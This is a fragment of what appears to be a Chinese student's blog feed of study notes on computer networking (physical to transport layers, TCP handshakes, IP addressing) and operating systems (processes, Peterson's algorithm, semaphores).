<pre class="line-numbers language-c"><code class="language-c">C <span class="token operator">=</span> 2H <span class="token operator">*</span> <span class="token function">logL</span> <span class="token punctuation">(</span>bps<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>L是数字信号的离散取值数目<br>C为信道的数据率<br>H为信道带宽</p>
<p>香农定理(有噪声信道, L不受限)</p>
<pre class="line-numbers language-c"><code class="language-c">C <span class="token operator">=</span> H <span class="token operator">*</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> S<span class="token operator">/</span>N<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>S为信号功率, N为噪声功率, S/N为信噪比</p>
<p>波特率: 码元速率, 美秒传输的码元的数目, 单位是波特(B)<br>若码元的离散取值数目是L, 波特率是B, 数据率是C, 则 <code>C = B * logL</code></p>
<p>误码率: 数字信号比特(二进制位)在传输中出现错误的概率</p>
<p>信道的通信方向: 单工信道, 半双工信道, 全双工信道<br>半双工是同一时刻只允许单向传输</p>
<h3 id="常用的物理传输媒介"><a href="#常用的物理传输媒介" class="headerlink" title="常用的物理传输媒介"></a>常用的物理传输媒介</h3><ol>
<li>双绞线</li>
<li>同轴电缆</li>
<li>光纤</li>
<li>无线电波</li>
</ol>
<h3 id="数字信号编码"><a href="#数字信号编码" class="headerlink" title="数字信号编码"></a>数字信号编码</h3><ul>
<li>非归零编码<br>高电平表示1, 低电平表示0<br>用于计算机内部</li>
<li>曼彻斯特编码<br>每一位中间有一次跳变, 既表示数据(上/下跳变), 又表示同步信号…<ul>
<li>含内部时钟, 收发端同步容易</li>
<li>抗干扰能力强<br>用于802.3局域网</li>
</ul>
</li>
<li>差分曼彻斯特<br>每一位中间也有一次跳变, 但这种跳变仅作为同步信号, 不代表数据.数据值通过每位开始有无跳变来决定<ul>
<li>含内部时钟, 收发端同步容易</li>
<li>抗干扰能力比曼彻斯特还要强</li>
</ul>
</li>
</ul>
<h3 id="数字调制技术"><a href="#数字调制技术" class="headerlink" title="数字调制技术"></a>数字调制技术</h3><pre><code>基带信号 - 调制 - 解调 - 基带信号
</code></pre><h3 id="模拟信号的脉码调制"><a href="#模拟信号的脉码调制" class="headerlink" title="模拟信号的脉码调制"></a>模拟信号的脉码调制</h3><p>脉码调制大概过程: 采样, 量化, 编码</p>
<p>差分脉码调制: 输出值不是量化值本身, 是当前值和上一个值的差值</p>
<h3 id="多路复用技术"><a href="#多路复用技术" class="headerlink" title="多路复用技术"></a>多路复用技术</h3><p>将多个信道复用在同一条物理线路上, 使得一条物理线路能够同时传输多路数据信号<br>具体方法有频分, 时分, 统计时分…我对这些不是很了解, 想先跳过</p>
<h3 id="数据同步方式"><a href="#数据同步方式" class="headerlink" title="数据同步方式"></a>数据同步方式</h3><h3 id="物理层协议"><a href="#物理层协议" class="headerlink" title="物理层协议"></a>物理层协议</h3><p>物理层协议实际上就是通信接口标准<br>机械特性, 功能特性, 规程特性, 电气特性…<br>好了就此打住, 我们先进入下一层</p>
<h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><p>主要功能: 在<code>相邻节点</code>间保证<code>数据帧</code>的透明传输</p>
<h3 id="数据帧"><a href="#数据帧" class="headerlink" title="数据帧"></a>数据帧</h3><pre><code>帧同步 | 目的地址 | 源地址 | 控制 | 数据 | 帧校验
</code></pre><h3 id="差错控制"><a href="#差错控制" class="headerlink" title="差错控制"></a>差错控制</h3><p>检错码: 能够发现差错, 但无法自动纠正差错, 通过重传来获得正确的数据.</p>
<ul>
<li>CRC循环冗余<br>纠错码: 不但能过发现差错, 而且知道哪些位出错, 从而能够自动纠正错误.</li>
<li>海明码</li>
</ul>
<h3 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h3><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><p>HDLC协议<br>PPP协议</p>
<h3 id="链路层的两个子层"><a href="#链路层的两个子层" class="headerlink" title="链路层的两个子层"></a>链路层的两个子层</h3><p>IEEE802系列标准把数据链路层分成LLC(Logical Link Control,逻辑链路控制)和MAC(Media Access Control,介质访问控制)两个子层</p>
<ul>
<li>MAC子层<br>主要负责数据帧的封装/卸载, 链路管理, 差错控制, MAC子层的存在屏蔽了不同物理链路种类的差异性<br>解决当局域网中共用信道的使用产生竞争时，如何分配信道的使用权问题</li>
<li>LLC子层<br>LLC是靠上的子层, 主要负责给上面的层(网络层)提供服务</li>
</ul>
<p>其实感觉下面两层好像不是那么的…重要…对于我想做的方面.<br><em>我暂时先跳过这一部分~~</em><br><em>有时间再回来</em><br><em>先学习网络层</em></p>
<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><p>在数据链路层的支持下, 将<code>报文分组</code>从<code>源节点</code>传输到<code>目的节点</code></p>
<h3 id="网络层和数据链路层区别"><a href="#网络层和数据链路层区别" class="headerlink" title="网络层和数据链路层区别"></a>网络层和数据链路层区别</h3><p>数据链路层仅仅完成相邻节点的数据传输, 而网络层完成源节点到目的节点的</p>
<h3 id="报文分组"><a href="#报文分组" class="headerlink" title="报文分组"></a>报文分组</h3><p>分组交换技术把报文分成若干分组…报文分组是网络层基本协议数据单元</p>
<pre><code>序号 | 源地址 | 目的地址 | 控制信息 | 长度 | 数据
</code></pre><p>分组是数据帧(链路层)的数据部分</p>
<h3 id="分组交换技术"><a href="#分组交换技术" class="headerlink" title="分组交换技术"></a>分组交换技术</h3><p>定义: 将一份完整的报文划分为若干个分组， 每个分组以存储/转发方式，独立地从源节点传输到目的节点， 目的节点收到这些分组重新组装成原报文</p>
<p>分组交换的特点</p>
<ul>
<li>化整为零, 存储转发</li>
</ul>
<p>分组交换技术的两种实现方法..</p>
<ul>
<li><p>虚电路</p>
<ul>
<li>先发出虚呼叫, 虚呼叫选择一条合适的道路到达目的地, 并赋一个电路号, 如果沿途的节点都准备就绪, 就建立虚电路…后续分组都走这个路径, 传输完毕, 拆除虚电路</li>
<li>仅当建立虚电路时需要源/目的节点地址， 数据分组只需分配一个虚电路号而无需携带完整的源/目的节点地址。</li>
<li>每个节点都需要保存一张虚电路表</li>
</ul>
</li>
<li><p>数据报</p>
<ul>
<li>数据报无需建立连接， 每个分组携带完整的源/目的地址， 独立的选择路径， 通过不同的路径到达目的主机</li>
<li>而且数据报不能保证先发出的分组未必先到达…因此数据包不能保证分组的顺序到达</li>
</ul>
</li>
</ul>
<h3 id="路由选择"><a href="#路由选择" class="headerlink" title="路由选择"></a>路由选择</h3><p>根据某种策略, 选择一条到达目的主机的最佳路径</p>
<p>路由选择由路由器完成；对单个路由器而言， 路由选择实质上是选择最佳输出链路（ 端口），多个路由器协作选择一条最佳路由。</p>
<p>虚电路需要一次路由选择, 而数据报需要为每个分组选择路由</p>
<p>分类: 静态路由, 动态路由(会根据当前拓扑结构和流量的变化动态改变路由, 又称为自适应路由)</p>
<h3 id="路由算法"><a href="#路由算法" class="headerlink" title="路由算法"></a>路由算法</h3><h4 id="静态路由算法"><a href="#静态路由算法" class="headerlink" title="静态路由算法"></a>静态路由算法</h4><ul>
<li>泛洪/扩散法<br>当节点收到一个分组后, 向除进来的链路转发<br>这样子会产生大量的重复分组</li>
<li>固定式路由选择<br>每个节点保存一张固定的路由表, 某一分组达到时候, 根据分组的目的地址, 找路由表</li>
</ul>
<h4 id="动态路由算法"><a href="#动态路由算法" class="headerlink" title="动态路由算法"></a>动态路由算法</h4><ul>
<li>热土豆算法</li>
<li>逆向自学习算法</li>
<li>距离向量路由算法(D-V算法)</li>
<li>链路状态路由选择算法(L-S算法)</li>
</ul>
<p>介绍完算法, 下面就是每一层的重点,,,就是协议~<br>这个时候可能产生一个想法, 网络层的协议有路由协议, IP协议(其实还有ARP, RARP, ICMP), 那么这两种协议之间有什么关系呢?<br>PPT说到的事, IP协议需要路由协议的支持, 如果这样的话, 是不是可以理解为…网络层其实可以分为两个子层…?还是说就是IP协议是核心, 该层其他协议都是支撑的</p>
<h3 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h3><p>某一种特定的路由协议中会使用特定的路由算法…所谓一种协议…不光包含使用的算法..还有一些其他的设定</p>
<ul>
<li>路由信息选择协议(RIP)</li>
<li>开放最短路由优先协议(OSPF)</li>
<li>边界网关协议(BGP)</li>
</ul>
<h3 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h3><p>IP地址</p>
<ul>
<li>A类 <pre><code>0 | 网络号(1-7)-7位 | 主机号(8-31)-24位
</code></pre></li>
<li>B类<pre><code>10 | 网络号(2-15)-14位 | 主机号(16-31)-16位
</code></pre></li>
<li>C类<pre><code>110 | 网络号(3-23)-21位 | 主机号(24-31)-8位
</code></pre></li>
<li>D类<pre><code>1110 | 组播地址(4-31)
</code></pre></li>
<li>E类<pre><code>11110 | 保留
</code></pre></li>
</ul>
<p>计算问题: A类网络中有<code>2^7 - 2</code>个网络, 每个网络最多<code>2^24 - 2</code>个主机</p>
<ul>
<li>问题:为什么要减去2</li>
</ul>
<p>特殊的IP地址</p>
<ul>
<li>全0</li>
<li>全1, 本地网络的广播地址</li>
<li>主机号全1, 广播地址</li>
<li>主机号全0, 表示网络号</li>
</ul>
<p>私用的IP地址<br>A类: 10.0.0.0<br>B类: 172.16.0.0 - 172.31.0.0<br>C类: 192.168.0.0 - 192.168.255.0</p>
<p>很重要的一点:<br>路由器根据目的网络号而不是目的IP地址转发IP分组， 以减少路由表的信息量<br>也就是说, 路由器只管帮你把报文从一个网路送达一个网络, 而到达目标网络后, 并不管你如何达到目标主机</p>
<p>子网掩码的作用是, 和ip地址进行与运算, 这样子就可以得到网络号, 然后可判断是否是本网络, 如果不是, 就根据路由表转发到下一路由器</p>
<h3 id="Internet控制协议"><a href="#Internet控制协议" class="headerlink" title="Internet控制协议"></a>Internet控制协议</h3><ul>
<li>ICMP</li>
<li>ARP</li>
<li>RARP</li>
</ul>
<h3 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h3><p>算是很重要的…<br>实质是使用若干位的主机号, 来标示子网号, 引入子网后, IP地址如下划分</p>
<pre><code>[前置 | 网络号 | 主机号] =&gt; [前置 | 网络号 | 子网号 | 主机号]
</code></pre><h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><p>传输层的任务是完成主机-主机之间的报文传输<br>传输层要彻底解决网络通信问题, 使得应用层不必关心通信问题</p>
<p>传输层是端到端的通信<br>网络层是源节点到目的节点的通信<br>数据链路层是相邻节点的通信</p>
<p>这个端到端, 点到点….怎么理解, 端从字面意思看的话, 其实和点差不多呀, 难不成端到端还意思是端口到端口…??</p>
<p>如果发送了4个有效载荷为512B的报文段， 接收方收到后， 向应用层提供2048B的字节流， 而不是4个报文段。 这是因为TCP是真正的端到端通信， 接收端无需再转发</p>
<p>传输层协议设计内容<br>寻址: 传输地址及发现<br>差错控制: 分组顺序, 差错检测, 重传确认机制<br>连接管理: 连接建立, 连接释放<br>流量控制: 直接之间流量控制</p>
<p>在这一层…传输地址由<code>网络号 + 主机号 + 端口号</code>来组成<br>在IP网络, 就是<code>IP地址 + 端口号</code></p>
<p>传输连接实质上是通过传输地址,建立<code>两个主机``进程</code>之间的连接</p>
<h3 id="报文段"><a href="#报文段" class="headerlink" title="报文段"></a>报文段</h3><p>这里具体的讲, 有TCP报文段, 和UDP报文段</p>
<h3 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h3><p>TCP传输地址 <code>&lt;源IP, 源端口, 目的IP, 目的端口&gt;</code><br>端口号16位, 范围是<code>0~65535</code><br>TCP不支持广播和组播<br>TCP是全双工的</p>
<p>报文段封装的位置</p>
<pre><code>帧头部 | IP头部 | TCP头部 | TCP有效载荷 | 帧校验
</code></pre><p>TCP报文段格式<br><em>太长不写了</em><br>大概是有源端口, 目的端口, 顺序号, 确认号, 校验和还有一些标志位和<br>超级常用的标志有<code>ACK</code>, <code>SYN</code>, <code>FIN</code>~</p>
<p>ACK: 标志位为1, 表示确认号有效, 否则无效<br>SYN: </p>
<ul>
<li>SYN为1, ACK为0, 则表示建立TCP连接</li>
<li>SYN为1, ACK为1, 则表示确认TCP连接<br>FIN: 用于释放连接, 若FIN置为1, 则表示没有数据要发送了, 但仍然可以接收数据</li>
</ul>
<p>校验和: 校验的范围是…喵喵喵???</p>
<h4 id="TCP连接管理"><a href="#TCP连接管理" class="headerlink" title="TCP连接管理"></a>TCP连接管理</h4><p>TCP连接建立的三次握手:</p>
<ol>
<li><p>client -&gt; Server<br>SYN = 1, ACK = 0, 顺序号 = x</p>
</li>
<li><p>Server -&gt; Client<br>SYN = 1, ACK = 1, 确认号 = x + 1, 顺序号 = y</p>
</li>
<li><p>client -&gt; Server<br>SYN = 0, ACK = 1, 顺序号 = x + 1, 确认号 = y + 1</p>
</li>
</ol>
<p>TCP连接释放的四次握手:</p>
<ol>
<li><p>Client -&gt; Server<br>FIN = 1, 顺序号 = x<br>Client宣布不再发送数据, 发出FIN</p>
</li>
<li><p>Server -&gt; Client<br>FIN = 0, ACK = 1, 确认号 = x + 1, 顺序号 = y<br>Server仍然传输数据<br>…中间可发送很多数据</p>
</li>
<li><p>Server -&gt; Client<br>FIN = 1, ACK = 1, 确认号 = x + 1, 顺序号 = w<br>Server端也停止传输, 发出FIN</p>
</li>
<li><p>Client -&gt; Server<br>ACk = 1, 确认号 = w + 1</p>
</li>
</ol>
<p>为什么释放要四次??<br> 因为是TCP是全双工的, 每个方向都要单独关闭</p>
<p>发送了FIN只是表示这端不能继续发送数据(应用层不能再调用send发送)，但是还可以接收数据</p>
<h4 id="TCP流量管理"><a href="#TCP流量管理" class="headerlink" title="TCP流量管理"></a>TCP流量管理</h4><h4 id="TCP拥塞控制"><a href="#TCP拥塞控制" class="headerlink" title="TCP拥塞控制"></a>TCP拥塞控制</h4><p>TCP拥塞控制与流量控制的区别</p>
<ul>
<li>拥塞控制是为了防止网络过载导致路由器缓冲区不足而造成IP分组的丢失</li>
<li>流量控制是为了防止发送端发送速度过快导致接收端缓冲区不足而造成TCP段的丢失</li>
</ul>
<h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><p>UDP是非面向连接, 不可靠的传输协议<br>UDP实质上在IP基础上, 增加了端口机制, 实现了主机进程间的数据传输</p>
<p>UDP的特点:(这些特点与TCP恰好相反)<br>TCP不需要建立连接, 是不可靠的传输协议<br>不支持流量控制和拥塞控制<br>支持广播和组播</p>
<p>有一个常见的问题是: 既然UDP也不可靠, 也是非连接的, 那么用IP就好了, 要啥UDP, 下面有请大佬解答&gt;&gt;&gt;<br>除了增加了端口, 还有其他的吗</p>
<p>UCP报文段</p>
<pre><code>源端口号 | 目的端口号
长度     | 校验和
用户数据
</code></pre><p>适合实时应用</p>
<h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>利用DNS的一个攻击方式 DNS rebinding Attack</p>
<h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><h3 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h3><h2 id="局域网"><a href="#局域网" class="headerlink" title="局域网"></a>局域网</h2><p>IEEE802标准</p>
<pre><code>=======+======+===============
链路层 + LLC  +    802.2
       +------+===============
       + MAC  + 802.3/802.4
-------+======+ 802.5/802.11
物理层 +      + .......
=======+======+===============
</code></pre><p>LLC是独立于通信介质的<br>LLC子层为MAC子层提供三种不同类型的服务：</p>
<ul>
<li>无确认连接</li>
<li>有确认无连接</li>
<li>面向连接</li>
</ul>
<p>对了..还有一点…LLC是被包装在MAC帧里面的…</p>
<h3 id="IEEE-802-3"><a href="#IEEE-802-3" class="headerlink" title="IEEE 802.3"></a>IEEE 802.3</h3><p>包括两部分</p>
<ul>
<li>介质访问控制(CSMA/CD)</li>
<li>物理层规范</li>
</ul>
<p>CSMA/CD</p>
<pre><code>[PA | DA | SA | L | LLC帧 | PAD | FCS]
</code></pre><p>LLC</p>
<pre><code>[DSAP | SSAP | 控制 | 数据]
</code></pre>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[对于系统的一些记录]]></title>
      <url>/2017/09/01/%E5%AF%B9%E4%BA%8E%E7%B3%BB%E7%BB%9F%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/</url>
      <content type="html"><![CDATA[<h2 id="2017-09-01"><a href="#2017-09-01" class="headerlink" title="2017-09-01"></a>2017-09-01</h2><p>这个…emmmm，<code>Ctrl + .</code> 是切换全角/半角符号</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[操作系统复习]]></title>
      <url>/2017/09/01/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0/</url>
      <content type="html"><![CDATA[<h2 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h2><p>OS作为用户和计算机硬件间的接口<br>OS作为用户与计算机系统资源的管理者<br>OS作为扩充器</p>
<h3 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h3><ol>
<li>无操作系统</li>
<li>单道批处理</li>
<li>多道批处理</li>
<li>分时/实时</li>
</ol>
<p>解释一下是， 分时的话是多终端连接到主机，对每一个终端来讲都有独占的感觉， 实时的话一般是专用系统中， 对于该系统能够忍受的时差内做出反应的系统</p>
<h3 id="基本特征"><a href="#基本特征" class="headerlink" title="基本特征"></a>基本特征</h3><ol>
<li><p>并发<br>并发: 多个事件在同一时间段内发生<br>并行：多个事件在同一时刻发生<br>并发实现的效果就是宏观上有多道程序同时运行, 而微观上是交替分时的进行</p>
</li>
<li><p>共享<br>多个计算任务对系统资源共同使用<br>共享会造成一些问题</p>
</li>
<li><p>虚拟<br>虚拟式把一个物理实体变为逻辑上的对应物</p>
<blockquote>
<p>其实计算机里对于不好解决的问题很多时候是通过加一层中间层来实现</p>
</blockquote>
</li>
<li><p>异步性<br>其实异步的概念一直不是很会用言语说出来<br>这里的异步大概是说如果因为某些情况阻塞掉了某些进程那么不需要等她, 等到时机成熟, 会有人来唤醒<br>异步其实常常和回调联系在一起</p>
</li>
</ol>
<h3 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h3><ol>
<li>处理器管理</li>
<li>存储器管理</li>
<li>设备管理</li>
<li>文件管理</li>
<li>用户接口</li>
</ol>
<p>前四点应该都算是资源管理， 最后一点是提供接口</p>
<h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><h3 id="程序顺序执行的特征"><a href="#程序顺序执行的特征" class="headerlink" title="程序顺序执行的特征"></a>程序顺序执行的特征</h3><ol>
<li>顺序性</li>
<li>封闭性</li>
<li>可再现性</li>
</ol>
<h3 id="进程特点"><a href="#进程特点" class="headerlink" title="进程特点"></a>进程特点</h3><ol>
<li>动态性</li>
<li>并发性</li>
<li>独立性</li>
<li>异步性</li>
</ol>
<blockquote>
<p>进程是进程实体运行的过程, 是系统进行资源分配和调度的独立单位</p>
</blockquote>
<h3 id="进程的基本状态"><a href="#进程的基本状态" class="headerlink" title="进程的基本状态"></a>进程的基本状态</h3><ol>
<li>就绪</li>
<li>执行</li>
<li>阻塞</li>
</ol>
<p>还有一种状态是<code>挂起</code><br><em>那挂起和阻塞的区别在哪里</em><br>挂起的话其实好像是直接把这个进程调到了外存里, 这样子的话, 如果好像挂起属于中级调度, 而阻塞的话, 进程还在内存中, 只在内存中的话, 这个调度还算是低级调度吧</p>
<h3 id="进程控制块"><a href="#进程控制块" class="headerlink" title="进程控制块"></a>进程控制块</h3><p>PCB(进程控制块), 是进程存在的唯一标识, 进程控制块位于操作系统内核</p>
<h3 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h3><ol>
<li><p>创建<br>用户登录 作业调度 提供服务 应用请求</p>
</li>
<li><p>撤销</p>
</li>
<li><p>阻塞<br>进程阻塞是自己阻塞掉自己, 然后再由其他人唤醒, 像是一个异步回调的过程(不知道算不算是)</p>
</li>
</ol>
<ul>
<li>请求资源</li>
<li>等待操作完成</li>
<li>新数据还未达到</li>
<li>等待新任务</li>
</ul>
<ol>
<li>唤醒</li>
</ol>
<h3 id="进程同步"><a href="#进程同步" class="headerlink" title="进程同步"></a>进程同步</h3><p>感觉比较复杂的一块<br>简单说通常就是由于<code>资源共享</code>造成的问题</p>
<p>两种制约形式</p>
<ol>
<li><p>间接相互制约<br>共享某种系统资源</p>
</li>
<li><p>直接相互制约<br>主要源于进程间合作</p>
</li>
</ol>
<h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>临界资源: 一次只能为一个进程所用的资源</p>
<ul>
<li>硬件: 打印机</li>
<li>软件：内存 指针 数组</li>
</ul>
<p>临界区：访问临界资源的代码段</p>
<pre><code>进入区
临界区
退出区
</code></pre><p>其实感觉进入区的设计很关键…不然的话可能就造成…<br>有的语句, 在高层比如C语言里看到是一条语句, 其实编译后很多条, 就不是原子的</p>
<p>同步机制遵循原则：</p>
<ul>
<li>空闲让进</li>
<li>忙则等待</li>
<li>有限等待</li>
<li>让权等待</li>
</ul>
<h4 id="过去的解决方法"><a href="#过去的解决方法" class="headerlink" title="过去的解决方法"></a>过去的解决方法</h4><p>软件<br>Peterson算法, 其实不是很理解…就是说自己不能很快写出</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> FALSE 0</span>
<span class="token macro property">#<span class="token directive keyword">define</span> TRUE 1 </span>
<span class="token macro property">#<span class="token directive keyword">define</span> N 2</span>

<span class="token keyword">int</span> turn<span class="token punctuation">;</span>
<span class="token keyword">int</span> interested<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">enter_region</span><span class="token punctuation">(</span><span class="token keyword">int</span> process<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span> other<span class="token punctuation">;</span>
    other <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">-</span> process<span class="token punctuation">;</span>
    interested<span class="token punctuation">[</span>process<span class="token punctuation">]</span> <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>
    turn <span class="token operator">=</span> process<span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>turn <span class="token operator">==</span> process <span class="token operator">&amp;&amp;</span> interested<span class="token punctuation">[</span>other<span class="token punctuation">]</span> <span class="token operator">==</span> TRUE<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">leave_region</span><span class="token punctuation">(</span><span class="token keyword">int</span> process<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    interested<span class="token punctuation">[</span>process<span class="token punctuation">]</span> <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p> 硬件</p>
<ol>
<li>TSL指令</li>
<li>SWAP指令<br>硬件解法的特点在于….这个</li>
</ol>
<h4 id="信号量机制"><a href="#信号量机制" class="headerlink" title="信号量机制"></a>信号量机制</h4><p>这个是比较好的解决方案, 由Dijkstra提出</p>
<h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><ol>
<li>整数信号量S<br>原子操作：</li>
</ol>
<ul>
<li>wait(P)<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">wait</span><span class="token punctuation">(</span><span class="token keyword">int</span> S<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">while</span><span class="token punctuation">(</span>S <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
  S <span class="token operator">-</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>singal(V)<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">Signal</span><span class="token punctuation">(</span><span class="token keyword">int</span> S<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  S <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<ol>
<li>记录型信号量S<br>由于整数型信号量里的<code>while(S &lt;= 0) ;</code>不符合让权等待<br>现在推出了这个记录型的信号量</li>
</ol>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> value<span class="token punctuation">;</span>
    <span class="token keyword">struct</span> process_contorl_block <span class="token operator">*</span>list<span class="token punctuation">;</span>
<span class="token punctuation">}</span>semaphore<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">wait</span><span class="token punctuation">(</span>semaphore <span class="token operator">*</span> S<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    S <span class="token operator">-></span> value<span class="token operator">--</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>S <span class="token operator">-></span> value <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token function">block</span><span class="token punctuation">(</span>S <span class="token operator">-></span> list<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">signal</span><span class="token punctuation">(</span>semaphore <span class="token operator">*</span> S<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    S <span class="token operator">-></span> value<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>S <span class="token operator">-></span> value <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token function">wakeup</span><span class="token punctuation">(</span>s <span class="token operator">-></span> list<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>下面有等于0, 是因为</p>
<p><code>S -&gt; value &gt;= 0</code>代表可用资源数量， <code>S -&gt; value &lt; 0</code>代表阻塞队列中进程的数量</p>
<h4 id="信号量作用"><a href="#信号量作用" class="headerlink" title="信号量作用"></a>信号量作用</h4><p>主要两个作用吧, 就是互斥和同步, 就是这样子</p>
<ol>
<li>用于互斥, 即同一时刻只能同一个人使用资源</li>
</ol>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> top <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> stack<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>
semaphore mutex<span class="token punctuation">;</span> 
mutex<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">proc1</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// 进程1</span>
    <span class="token function">wait</span><span class="token punctuation">(</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 进入</span>

    top <span class="token operator">=</span> <span class="token punctuation">(</span>top <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">;</span>
    stack<span class="token punctuation">[</span>top<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span>

    <span class="token function">signal</span><span class="token punctuation">(</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 退出</span>
<span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">proc2</span><span class="token punctuation">(</span><span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// 进程2</span>
    <span class="token function">wait</span><span class="token punctuation">(</span>S<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//进入</span>

    top <span class="token operator">=</span> <span class="token punctuation">(</span>top <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">;</span>
    stack<span class="token punctuation">[</span>top<span class="token punctuation">]</span> <span class="token operator">=</span> y<span class="token punctuation">;</span>

    <span class="token function">signal</span><span class="token punctuation">(</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//退出</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol>
<li>用于同步<br>这个说的是那种合作的进程…<br>比如生产者消费者问题应该是就算这种的<br>生产者消费者共享缓冲池, 其实对于生产者消费者分别相当于是, 空位置和非空位置是资源<br>而且生产和消费不能同时进行<br>而且下面的例子是那个,,,单消费者单生产者多缓冲区</li>
</ol>
